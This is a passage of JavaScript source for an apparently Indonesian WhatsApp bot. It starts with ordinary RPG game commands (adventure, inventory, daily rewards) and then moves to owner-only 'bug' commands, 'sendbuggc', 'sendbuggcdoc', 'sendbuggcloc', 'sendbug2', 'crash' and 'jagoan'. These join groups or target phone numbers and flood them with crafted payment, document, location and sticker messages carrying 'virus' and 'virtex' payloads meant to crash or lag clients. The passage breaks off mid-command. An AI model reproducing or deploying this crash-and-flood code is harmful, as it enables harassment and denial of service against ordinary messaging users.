global.db.data.users[m.sender].healt -= healt * 1
global.db.data.users[m.sender].exp += exp * 1
global.db.data.users[m.sender].money += uang * 1
global.db.data.users[m.sender].potion += potion * 1
global.db.data.users[m.sender].diamond += diamond * 1
global.db.data.users[m.sender].common += common * 1 
global.db.data.users[m.sender].uncommon += uncommon * 1
global.db.data.users[m.sender].sampah += sampah * 1
global.db.data.users[m.sender].iron += iron * 1
global.db.data.users[m.sender].batu += batu * 1
global.db.data.users[m.sender].kayu += kayu * 1
global.db.data.users[m.sender].string += string * 1
global.db.data.users[m.sender].lastadventure = new Date * 1
} else m.reply(`Anda sudah bekerja keras hari ini, silahkan menunggu sampai *${timers}*`)
} else m.reply('Minimal 80 health untuk bisa bercocok tanam, beli obat dulu biar kuat dengan ketik *' + prefix + 'shop buy potion <jumlah>*\ndan ketik *' + prefix + 'use potion <jumlah>*\n\n_Untuk mendapat money dan potion gratis ketik_ *' + prefix + 'daily*')
} catch (e) {
console.log(e)
throw m.reply('err')
}
}
break    
case 'inv': case 'inventory': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
let levelling = require('./lib/levelling')
let fetch = require('node-fetch')
let PhoneNumber = require('awesome-phonenumber')
let date = global.wm
    let { registered, age, lastrampok, lastdagang, lastcodereg, lastberkebon, lasthourly, lastberburu, lastbansos, lastadventure, lastfishing, lastwar, lastduel, lastmining, lastdungeon, lastclaim, lastweekly, lastmonthly } = global.db.data.users[m.sender]

    let healt = global.db.data.users[m.sender].healt
    let lapar = global.db.data.users[m.sender].laper
    let haus = global.db.data.users[m.sender].haus
    let usrname = global.db.data.users[m.sender].name
    let stamina = global.db.data.users[m.sender].stamina
    let armor = global.db.data.users[m.sender].armor 
    let sword = global.db.data.users[m.sender].sword
    let sdurability = global.db.data.users[m.sender].sworddurability
    let warn = global.db.data.users[m.sender].warn
    let premium = global.db.data.users[m.sender].premium
    let tprem = global.db.data.users[m.sender].tprem
    let pancing = global.db.data.users[m.sender].pancing
    let fdurability = global.db.data.users[m.sender].fishingroddurability
    let role = global.db.data.users[m.sender].role
    let pickaxe = global.db.data.users[m.sender].pickaxe
    let pdurability = global.db.data.users[m.sender].pickaxedurability

    let psepick = global.db.data.users[m.sender].psepick
    let psenjata = global.db.data.users[m.sender].psenjata

    let ikan= global.db.data.users[m.sender].ikan
    let nila= global.db.data.users[m.sender].nila
    let bawal= global.db.data.users[m.sender].bawal
    let lele= global.db.data.users[m.sender].lele
    let udangb= global.db.data.users[m.sender].udang

    let apel = global.db.data.users[m.sender].apel
    let ayamg = global.db.data.users[m.sender].ayamg
    let ayamb = global.db.data.users[m.sender].ayamb
    let sapir = global.db.data.users[m.sender].sapir
    let ssapi = global.db.data.users[m.sender].ssapi
    let kayu = global.db.data.users[m.sender].kayu
    let string = global.db.data.users[m.sender].string
    let emas = global.db.data.users[m.sender].emas
    let besi = global.db.data.users[m.sender].iron
    let batu = global.db.data.users[m.sender].batu
    let sapi = global.db.data.users[m.sender].sapi
    let ayam = global.db.data.users[m.sender].ayam
    let babi = global.db.data.users[m.sender].babi
    let banteng = global.db.data.users[m.sender].banteng
    let pet = global.db.data.users[m.sender].pet
    let kucing = global.db.data.users[m.sender].kucing
    let _kucing = global.db.data.users[m.sender].anakkucing
    let rubah = global.db.data.users[m.sender].rubah
    let _rubah = global.db.data.users[m.sender].anakrubah
    let kuda = global.db.data.users[m.sender].kuda
    let _kuda = global.db.data.users[m.sender].anakkuda
    let serigala = global.db.data.users[m.sender].serigala
    let _serigala = global.db.data.users[m.sender].anakserigala
    let phonix = global.db.data.users[m.sender].phonix
    let _phonix = global.db.data.users[m.sender].anakphonix
    let griffin = global.db.data.users[m.sender].griffin
    let _griffin = global.db.data.users[m.sender].anakgriffin
    let kyubi = global.db.data.users[m.sender].kyubi
    let _kyubi = global.db.data.users[m.sender].anakkyubi
    let centaur = global.db.data.users[m.sender].centaur
    let _centaur = global.db.data.users[m.sender].anakcentaur
    let naga = global.db.data.users[m.sender].naga
    let _naga = global.db.data.users[m.sender].anaknaga
    let diamond = global.db.data.users[m.sender].diamond
    let potion = global.db.data.users[m.sender].potion
    let common = global.db.data.users[m.sender].common
    let makananpet = global.db.data.users[m.sender].makananpet
    let makanannaga = global.db.data.users[m.sender].makanannaga                                         
    let makananphonix = global.db.data.users[m.sender].makananphonix                                     
    let makanangriffin = global.db.data.users[m.sender].makanangriffin
    let makanankyubi = global.db.data.users[m.sender].makanankyubi                                       
    let makanancentaur = global.db.data.users[m.sender].makanancentaur
    let uncommon = global.db.data.users[m.sender].uncommon
    let mythic = global.db.data.users[m.sender].mythic
    let legendary = global.db.data.users[m.sender].legendary
    let level = global.db.data.users[m.sender].level
    let money = global.db.data.users[m.sender].money
    let exp = global.db.data.users[m.sender].exp
    let atm = global.db.data.users[m.sender].atm
    let aqua = global.db.data.users[m.sender].aqua
    let pasangan = global.db.data.users[m.sender].pasangan
    let ramuan = global.db.data.users[m.sender].ramuan
    let kaleng = global.db.data.users[m.sender].kaleng                    
    let kardus = global.db.data.users[m.sender].kardus
    let botol = global.db.data.users[m.sender].botol
    let arlok = global.db.data.users[m.sender].arlok
    let limit = global.db.data.users[m.sender].limit
    let glimit = global.db.data.users[m.sender].glimit
    let sampah = global.db.data.users[m.sender].sampah
    let anggur = global.db.data.users[m.sender].anggur
    let jeruk = global.db.data.users[m.sender].jeruk
    let mangga = global.db.data.users[m.sender].mangga                                      
    let pisang = global.db.data.users[m.sender].pisang                                      
    let bibitanggur = global.db.data.users[m.sender].bibitanggur                            
    let bibitjeruk = global.db.data.users[m.sender].bibitjeruk                              
    let bibitapel = global.db.data.users[m.sender].bibitapel
    let bibitmangga = global.db.data.users[m.sender].bibitmangga                            
    let bibitpisang = global.db.data.users[m.sender].bibitpisang
    let { max } = levelling.xpRange(level, exp, global.multiplier)
    let sortedmoney = Object.entries(global.db.data.users).sort((a, b) => b[1].money - a[1].money)
    let sortedgold = Object.entries(global.db.data.users).sort((a, b) => b[1].gold - a[1].gold)
    let sortedarlok = Object.entries(global.db.data.users).sort((a, b) => b[1].arlok - a[1].arlok)
    let sortedlevel = Object.entries(global.db.data.users).sort((a, b) => b[1].level - a[1].level)
    let sorteddiamond = Object.entries(global.db.data.users).sort((a, b) => b[1].diamond - a[1].diamond)
    let sortedpotion = Object.entries(global.db.data.users).sort((a, b) => b[1].potion - a[1].potion)
    let sortedsampah = Object.entries(global.db.data.users).sort((a, b) => b[1].sampah - a[1].sampah)
    let sortedcommon = Object.entries(global.db.data.users).sort((a, b) => b[1].common - a[1].common)
    let sorteduncommon = Object.entries(global.db.data.users).sort((a, b) => b[1].uncommon - a[1].uncommon)
    let sortedmythic = Object.entries(global.db.data.users).sort((a, b) => b[1].mythic - a[1].mythic)
    let sortedlegendary = Object.entries(global.db.data.users).sort((a, b) => b[1].legendary - a[1].legendary)
    let usersmoney = sortedmoney.map(v => v[0])
    let usersgold = sortedgold.map(v => v[0])
    let usersarlok = sortedarlok.map(v => v[0])
    let usersdiamond = sorteddiamond.map(v => v[0])
    let userspotion = sortedpotion.map(v => v[0])
    let userssampah = sortedsampah.map(v => v[0])
    let userslevel = sortedlevel.map(v => v[0])
    let userscommon = sortedcommon.map(v => v[0])
    let usersuncommon = sorteduncommon.map(v => v[0])
    let usersmythic = sortedmythic.map(v => v[0])
    let userslegendary = sortedlegendary.map(v => v[0])
    
    let kambing = global.db.data.users[m.sender].kambing
    let kerbau = global.db.data.users[m.sender].kerbau
    let harimau = global.db.data.users[m.sender].harimau
    let monyet = global.db.data.users[m.sender].monyet
    let babihutan = global.db.data.users[m.sender].babihutan
    let panda = global.db.data.users[m.sender].panda
    let gajah = global.db.data.users[m.sender].gajah
    let buaya = global.db.data.users[m.sender].buaya
    
    let paus = global.db.data.users[m.sender].paus
    let kepiting = global.db.data.users[m.sender].kepiting
    let gurita = global.db.data.users[m.sender].gurita
    let cumi = global.db.data.users[m.sender].cumi
    let lumba = global.db.data.users[m.sender].lumba
    let lobster = global.db.data.users[m.sender].lobster
    let hiu = global.db.data.users[m.sender].hiu
    let udang = global.db.data.users[m.sender].udang
    let orca = global.db.data.users[m.sender].orca

    let pp = 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=Inventory'
    let str = `
*──────────❏ Status ❏──────────*
📡 *Status:* ${premium ? "Premium": "Free"} User
📇 *Name:* ${usrname} 
❗ *Warn:* ${warn}
⛔ *Banned:* No
❤️️ *Health:* ${healt}
⚡ *Stamina:* ${stamina}
💹 *Money:* $${money}
💳 *Bank:* $${atm}
📊 *Level:* ${level}
✨ *Exp:* ${exp}
📍 *Role:* ${role}
🎫 *Limit:* ${limit}
${registered ? '🎨 *Age:* ' + age : ''}
*──────────❏ Tools ❏──────────*
🥼 *Armor:* ${armor == 0 ? '❌' : '' || armor == 1 ? 'Leather Armor' : '' || armor == 2 ? 'Iron Armor' : '' || armor == 3 ? 'Gold Armor' : '' || armor == 4 ? 'Diamond Armor' : '' || armor == 5 ? 'Netherite Armor' : ''}
⚔️ *Sword:* ${sword == 0 ? '❌' : '' || sword == 1 ? 'wooden sword' : '' || sword == 2 ? 'Stone sword' : '' || sword == 3 ? 'Iron sword' : '' || sword == 4 ? 'Diamond sword' : '' || sword > 0 && sword < 5 ? `Ketahanan (*${_sword}* / *${sword *100}*)` : '' || sword == 5 ? '*Netherite Sword*' : ''}
╰ *Durability:* ${sdurability}
⛏️ *Pickaxe:* ${pickaxe == 0 ? '❌' : '' || pickaxe == 1 ? 'wooden pickaxe' : '' || pickaxe == 2 ? 'stone pickaxe' : '' || pickaxe == 3 ? 'Iron pickaxe' : '' || pickaxe == 4 ? 'Diamond pickaxe' : '' || pickaxe == 5 ? 'Netherite pickaxe' : ''}
╰ *Durability:* ${pdurability}
🎣 *Fishingrod:* ${pancing == 0 ? '❌' : '' || pancing == 1 ? 'Wooden Fishingrod' : '' || pancing == 2 ? 'Iron Fishingrod ' : '' || pancing == 1 ? 'Diamond Fishingrod' : '' || pancing == 1 ? 'Netherite Fishingrod' : '' }
╰ *Durability:* ${fdurability}
🏹 *Bow:* Cooming Soon!
*──────────❏ Kandang ❏──────────*
🐔 *Ayam:* ${ayam}    
🐐 *Kambing:* ${kambing}
🐄 *Sapi:* ${sapi} 
🐃 *Kerbau:* ${kerbau}
🐖 *Babi:* ${babi}    
🐅 *Harimau:* ${harimau}
🐂 *Banteng:* ${banteng} 
🐒 *Monyet:* ${monyet}
🐗 *Babi Hutan:* ${babihutan}
🐼 *Panda:* ${panda}
🐘 *Gajah:* ${gajah}
🐊 *Buaya:* ${buaya}
🥢 Bisa kamu masak */masak ayamb*
💬 *Total Hewan:* ${ buaya + gajah + panda + babihutan + monyet + harimau + kerbau + kambing + ayam + sapi + babi + banteng } tangkapan
*──────────❏ Kolam ❏──────────*
🐋 *Orca:* ${orca}
🐳 *Paus:* ${paus}
🐬 *Lumba:* ${lumba}
🦈 *Hiu:* ${hiu}
🐟 *Ikan:* ${ikan}
🐟 *Lele:* ${lele}
🐡 *Bawal:* ${bawal}
🐠 *Nila:* ${nila}
🦀 *Kepiting:* ${kepiting}
🦞 *Lobster:* ${lobster}
🐙 *Gurita:* ${gurita}
🦑 *Cumi:* ${cumi}
🦐 *Udang:* ${udang}
💬 *Total Ikan:* ${orca + udang + hiu + lobster + lumba + cumi + gurita + kepiting + paus + nila + bawal + ikan + lele + psepick + psenjata }
*──────────❏ Inventory ❏──────────*
💎 *Diamond:* ${diamond}
🧪 *Ramuan:* ${ramuan}
🥤 *Potion:* ${potion}
🗑️ *Sampah:* ${sampah}
🥫 *Kaleng:* ${kaleng}
📦 *Kardus:* ${kardus}
🪵  *Kayu:* ${kayu}
🕸️ *String:* ${string}
🪙  *Gold:* ${emas}
⛓  *Iron:* ${besi}
🪨  *Batu:* ${batu}
🧭 *Arloji:* ${arlok}
*──────────❏ Food ❏──────────*
🥓 *FoodPet :* ${makananpet}
🍖 *ayam bakar:* ${ayamb}
🍗 *ayam goreng:* ${ayamg}
🥘 *Rendang Sapi :* ${sapir}
🥩 *steak sapi:* ${ssapi}
🍶 *Aqua:* ${aqua}
🎒 *Total inv:* ${aqua + ramuan + kardus + kaleng + arlok + psepick + psenjata + common + uncommon + mythic + legendary + pet + diamond + potion + besi + emas + string + sampah + kayu + batu + potion + sampah + makananpet + apel + ayamb + ayamg + sapir + ssapi } item
*──────────❏ Fruit & Seed ❏──────────*
🥭 *Mangga:* ${mangga}
🍇 *Anggur:* ${anggur}
🍌 *Pisang:* ${pisang}
🍊 *Jeruk:* ${jeruk}
🍎 *Apel:* ${apel}
🌾 *Bibit Mangga:* ${bibitmangga}
🌾 *Bibit Anggur:* ${bibitanggur}                                    
🌾 *Bibit Pisang:* ${bibitpisang}
🌾 *Bibit Jeruk:* ${bibitjeruk}
🌾 *Bibit Apel:* ${bibitapel}
*──────────❏ Crate ❏──────────*
📦 *Common:* ${common}
🛍️ *Uncommon:* ${uncommon}
🎁 *Mythic:* ${mythic}
🧰 *Legendary:* ${legendary}
📫 *Pet:* ${pet}
*──────────❏ Pet ❏──────────*
🐴 *Kuda:* ${kuda == 0 ? '❌' : '' || kuda == 1 ? 'Level 1' : '' || kuda == 2 ? 'Level 2' : '' || kuda == 3 ? 'Level 3' : '' || kuda == 4 ? 'Level 4' : '' || kuda == 5 ? 'Level MAX' : ''}
🦊 *Rubah:* ${rubah == 0 ? '❌' : '' || rubah == 1 ? 'Level 1' : '' || rubah == 2 ? 'Level 2' : '' || rubah == 3 ? 'Level 3' : '' || rubah == 4 ? 'Level 4' : '' || rubah == 5 ? 'Level MAX' : ''}
🐱 *Kucing:* ${kucing == 0 ? '❌' : '' || kucing == 1 ? 'Level 1' : '' || kucing == 2 ? 'Level 2' : '' || kucing == 3 ? 'Level 3' : '' || kucing == 4 ? 'Level 4' : '' || kucing == 5 ? 'Level MAX' : ''}
🐉 *Naga:* ${naga == 0 ? '❌' : '' || naga == 1 ? 'Level 1' : '' || naga == 2 ? 'Level 2' : '' || naga == 3 ? 'Level 3' : '' || naga == 4 ? 'Level 4' : '' || naga == 5 ? 'Level MAX' : ''}
🦜 *Phonix:* ${phonix == 0 ? '❌' : '' || phonix == 1 ? 'Level 1' : '' || phonix == 2 ? 'Level 2' : '' || phonix == 3 ? 'Level 3' : '' || phonix == 4 ? 'Level 4' : '' || phonix == 5 ? 'Level MAX' : ''}
🐎 *Centaur:* ${centaur == 0 ? '❌' : '' || centaur == 1 ? 'Level 1' : '' || centaur == 2 ? 'Level 2' : '' || centaur == 3 ? 'Level 3' : '' || centaur == 4 ? 'Level 4' : '' || centaur == 5 ? 'Level MAX' : ''}
🦅 *Griffin:* ${griffin == 0 ? '❌' : '' || griffin == 1 ? 'Level 1' : '' || griffin == 2 ? 'Level 2' : '' || griffin == 3 ? 'Level 3' : '' || griffin == 4 ? 'Level 4' : '' || griffin == 5 ? 'Level MAX' : ''}
🐺 *Serigala:* ${serigala == 0 ? '❌' : '' || serigala == 1 ? 'Level 1' : '' || serigala == 2 ? 'Level 2' : '' || serigala == 3 ? 'Level 3' : '' || naga == 4 ? 'Level 4' : '' || serigala == 5 ? 'Level MAX' : ''}
*──────────❏ Progses ❏──────────*
╭────────────────
│ 📊 *Level:* ${level} ➠  ${level + 1}
│ ✨ *Exp:* ${exp} ➠ ${max}
╰────────────────
╭────────────────
│🦊 *Rubah :* ${rubah == 0 ? '❌' : '' || rubah > 0 && rubah < 5 ? `Level *${rubah}* ➠ *${rubah + 1}*\n│Exp *${_rubah}* -> *${rubah *100}*` : '' || rubah == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🐱 *Kucing :* ${kucing == 0 ? '❌' : '' || kucing > 0 && kucing < 5 ? `Level *${kucing}* ➠ *${kucing + 1}*\n│Exp *${_kucing}* -> *${kucing *100}*` : '' || kucing == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🐴 *Kuda :* ${kuda == 0 ? '❌' : '' || kuda > 0 && kuda < 5 ? `Level *${kuda}* ➠ *${kuda + 1}*\n│Exp *${_kuda}* -> *${kuda *100}*` : '' || kuda == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🐉 *Naga :* ${naga == 0 ? '❌' : '' || naga > 0 && naga < 5 ? `Level *${naga}* ➠ *${naga + 1}*\n│Exp *${_naga}* -> *${naga *100}*` : '' || naga == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🦜 *Phonix :* ${phonix == 0 ? '❌' : '' || phonix > 0 && phonix < 5 ? `Level *${phonix}* ➠ *${phonix + 1}*\n│Exp *${_phonix}* -> *${phonix *100}*` : '' || phonix == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🐎 *Centaur :* ${centaur == 0 ? '❌' : '' || centaur > 0 && centaur < 5 ? `Level *${centaur}* ➠ *${centaur + 1}*\n│Exp *${_centaur}* -> *${centaur *100}*` : '' || centaur == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🦅 *Griffin :* ${griffin == 0 ? '❌' : '' || griffin > 0 && griffin < 5 ? `Level *${griffin}* ➠ *${griffin + 1}*\n│Exp *${_griffin}* -> *${griffin *100}*` : '' || griffin == 5 ? '*Max Level*' : ''}
╰────────────────
╭────────────────
│🐺 *Serigala :* ${serigala == 0 ? '❌' : '' || serigala > 0 && serigala < 5 ? `Level *${serigala}* ➠ *${serigala + 1}*\n│Exp *${_serigala}* -> *${serigala *100}*` : '' || serigala == 5 ? '*Max Level*' : ''}
╰────────────────
*──────────❏ Cooldown ❏──────────*
*🏹 Berburu :* ${lastberburu > 0 ? '❌' : '✅'}
*⛰️ Adventure :* ${lastadventure > 0 ? '❌' : '✅'}
*⚔️ Duel :* ${lastduel > 0 ? '❌' : '✅'}
*🛡️ War :* ${lastwar > 0 ? '❌'  : '✅'}
*🎃 Dungeon :* ${lastdungeon > 0 ? '❌' : '✅'}
*💱 Berdagang :* ${lastdagang > 0 ? '❌'  : '✅'}
*🧺 Berkebun :* ${lastberkebon > 0 ? '❌'  : '✅'}
*⛏️ Mining :* ${lastmining > 0 ? '❌' : '✅'}
*🎣 Fishing :* ${lastfishing > 0 ? '❌'  : '✅'}
*💰 Bansos :* ${lastbansos > 0 ? '❌' : '✅'}
*🕐 Hourly :* ${lasthourly > 0 ? '❌' : '✅'}
*📦 Claim :* ${lastclaim > 0 ? '❌' : '✅'}
*🎁 Weekly :* ${lastweekly > 0 ? '❌' : '✅'}
*📮 Monthly :* ${lastmonthly > 0 ? '❌' : '✅'}
*──────────❏ Achievement ❏──────────*
📊 *Top level:* ${userslevel.indexOf(m.sender) + 1} / ${userslevel.length}
💹 *Top Money:* ${usersmoney.indexOf(m.sender) + 1} / ${usersmoney.length}
🪙  *Top Gold:* ${usersgold.indexOf(m.sender) + 1} / ${usersgold.length}
💎 *Top Diamond:* ${usersdiamond.indexOf(m.sender) + 1} / ${usersdiamond.length}
🧭 *Top Arloji:* ${usersarlok.indexOf(m.sender) + 1} / ${usersarlok.length}
🥤 *Top Potion:* ${userspotion.indexOf(m.sender) + 1} / ${userspotion.length}
📦 *Top Common:* ${userscommon.indexOf(m.sender) + 1} / ${userscommon.length}
🛍️ *Top Uncommon:* ${usersuncommon.indexOf(m.sender) + 1} / ${usersuncommon.length}
🎁 *Top Mythic:* ${usersmythic.indexOf(m.sender) + 1} / ${usersmythic.length}
🧰 *Top Legendary:* ${userslegendary.indexOf(m.sender) + 1} / ${userslegendary.length}
🗑️ *Top Sampah:* ${userssampah.indexOf(m.sender) + 1} / ${userssampah.length}
`
Dani.sendMessage(m.chat, { text: `${str}`,
contextInfo: {   
externalAdReply :{
mediaUrl: fs.readFileSync('./media/image/bug.jpg'),
renderLargerThumbnail: true,
mediaType: 1,
description: `Ok`, 
body: `Powered By ©Dani`,
thumbnail: fs.readFileSync('./media/image/bug.jpg'),
sourceUrl: ``
 }}
  }, { quoted: freply })
}
break
case 'daily': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
let user = global.db.data.users[m.sender]
let __timers = (new Date - user.lastclaim2)
let _timers = (86400000 - __timers)
let timers = clockString(_timers) 
if (new Date - user.lastclaim2 > 86400000) {
m.reply(`Anda sudah mengklaim dan mendapatkan 300 XP, 1000 💵money dan 1 potion`)
global.db.data.users[m.sender].money += 1000
global.db.data.users[m.sender].potion += 1
global.db.data.users[m.sender].exp += 300
global.db.data.users[m.sender].lastclaim2 = new Date * 1
} else {
m.reply(`silahkan tunggu *🕒${timers}* lagi untuk bisa mengclaim lagi`)
}
}
break
case 'sendbuggc':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await Dani.groupAcceptInvite(result)
Dani.relayMessage(kir, {
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `© DANI BUG HUNTER ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: pp_bot }}}}, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'sendbuggcdoc':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await Dani.groupAcceptInvite(result)
Dani.sendMessage(kir, { 
document:pp_bot, 
fileName: `🔥 © DANI BUG HUNTER ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: pp_bot, 
mentions:[sender] }, {quoted:lep})
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'sendbuggcloc':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await Dani.groupAcceptInvite(result)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/image/bug.jpg') }, { upload: Dani.waUploadToServer })
var location = generateWAMessageFromContent(kir, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"name": `@ DANI BUG HUNTER ${virus}`,
"address": `© DANI BUG HUNTER ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted: lep })
Dani.relayMessage(kir, location.message, { messageId: location.key.id })
await sleep(1000)
}
m.reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
case 'sendbug':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Contoh\n${prefix+command} 628×××××`)
let nonye = [`${q}`]
teks = `*Janji Gk Lag*`
teks1 = `\nDaniXCoders`
for (let i of nonye) {
Dani.sendMessage(i + "@s.whatsapp.net", {text: teks + teks1, mentions:[m.sender]}, {quoted:doc})
}
Dani.sendMessage(m.chat, {text: `Sukses`, mentions:[m.sender]}, {quoted:freply})
}
break
case 'sendbug2':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Penggunaan ${prefix+command} 6285842107854`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
Dani.sendMessage(num,{text:`hai`},{quoted:lep})
await sleep(1000)
}
m.reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
}
break
case 'crash':{
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
jumlah = '15'
for (let i = 0; i < jumlah; i++) {
Dani.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: pp_bot},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
await sleep(1000)
}
m.reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
}
break
case 'jagoan' : {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285807264974`)
Dani.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: 'Hai Aku Dani', 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
contextInfo:{
"externalAdReply": {
"title": `© DANI BUG ${virus}${virtex(prefix)}`,
"body": `© DANI BUG ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `© DANI BUG HUNTER ${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: pp_bot, 
thumbnail: pp_bot,
}
}}}}}, { quoted:crsh })
await sleep(1000)
}
break
case 'jagoanneon' : {
addCountCmd(`#${command.slice(0)}`, sender, _cmd) 
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
Dani.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `© DANI BUG HUNTER ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
contextInfo:{
"externalAdReply": {
"title": `© DANI BUG`,
"body": `Masih Bawahan`,
